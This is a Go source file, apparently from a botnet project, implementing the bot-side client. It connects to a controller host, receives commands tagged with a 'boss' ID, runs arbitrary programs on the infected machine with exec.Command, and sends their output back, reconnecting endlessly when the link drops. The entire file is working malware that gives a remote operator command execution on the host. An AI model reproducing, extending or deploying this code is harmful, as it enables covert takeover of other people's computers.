package tcp

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/phanletrunghieu/bot-net/common/cmd"
)

// Service struct
type Service struct {
	host          string
	port          int
	connection    net.Conn
	reconnectTime time.Duration
	Error         chan error
}

// NewTCPService create tcpService struct
func NewTCPService(host string, port int) *Service {
	return &Service{
		host:          host,
		port:          port,
		reconnectTime: time.Second,
		Error:         make(chan error),
	}
}

// Run wait for a connection
func (s *Service) Run() {
	conn, err := net.Dial("tcp", s.host+":"+strconv.Itoa(s.port))
	if err != nil {
		go func() {
			s.Error <- err
		}()
		s.Reconnect()
		return
	}

	s.connection = conn
	defer s.connection.Close()

	for {
		// read cmd
		buffCommand := make([]byte, 2)
		_, err := s.connection.Read(buffCommand)
		if err != nil {
			go func() {
				s.Error <- err
			}()
			s.Reconnect()
			return
		}

		// read boss id
		buffBoss := make([]byte, 16)
		_, err = s.connection.Read(buffBoss)
		if err != nil {
			go func() {
				s.Error <- err
			}()
			s.Reconnect()
			return
		}

		switch string(buffCommand) {
		case cmd.Execute:
			output := s.executeCommand()
			data := append([]byte(cmd.Result), buffBoss...)
			data = append(data, output...)
			data = append(data, '\r')
			s.connection.Write(data)
		}
	}
}

// Reconnect try connect when lost connection
func (s *Service) Reconnect() {
	time.Sleep(s.reconnectTime)

	log.Println("Try reconnect...")

	s.Run()
}

func (s *Service) executeCommand() []byte {
	msg, err := bufio.NewReader(s.connection).ReadString('\r')
	if err != nil {
		s.Error <- err
		return nil
	}

	msg = strings.TrimSpace(msg)
	cmdArgs := strings.Split(msg, " ")
	mcmd := cmdArgs[0]
	cmdArgs = append(cmdArgs[:0], cmdArgs[0+1:]...)

	command := exec.Command(mcmd, cmdArgs...)
	output, err := command.Output()
	if err != nil {
		s.Error <- err
		return nil
	}

	return output
}
